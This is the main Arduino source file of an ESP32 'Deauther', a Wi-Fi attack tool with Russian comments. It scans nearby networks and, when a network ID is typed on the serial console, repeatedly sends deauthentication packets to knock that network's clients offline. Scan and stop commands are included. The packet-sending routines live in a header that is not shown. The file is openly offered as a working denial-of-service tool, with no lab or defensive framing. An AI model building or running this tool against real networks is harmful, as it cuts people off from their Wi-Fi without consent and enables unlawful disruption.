#include <Arduino.h>
#include <WiFi.h>
#include <esp_task_wdt.h> // Для сброса watchdog
#include "config.h"
#include "scan.h"
#include "deauth.h"

void setup() {
    Serial.begin(SERIAL_BAUD);
    delay(1000);
    
    // Отключаем Task Watchdog для главной задачи, чтобы он не ресетил плату при долгих операциях
    // esp_task_wdt_deinit(); // Раскомментируй, если будут постоянные ресеты
    
    Serial.println("ESP32 Deauther Started");
    
    // Начальный скан
    scanNetworks();
}

void loop() {
    // Кормим watchdog, чтобы плата не думала, что мы зависли
    yield(); 
    esp_task_wdt_reset();

    // Обработка атаки
    if (isAttacking) {
        sendDeauthPackets();
    }
    
    // Обработка команд из Serial
    if (Serial.available() > 0) {
        String input = Serial.readStringUntil('\n');
        input.trim();
        
        if (input.equalsIgnoreCase("scan")) {
            stopDeauth();
            scanNetworks();
        } 
        else if (input.equalsIgnoreCase("stop")) {
            stopDeauth();
        } 
        else {
            // Проверяем, число ли это
            int id = input.toInt();
            if (id >= 0 && id < networkCount) {
                startDeauth(id);
            } else {
                Serial.println("Unknown command. Use: scan, stop, or <ID number>");
            }
        }
    }
}
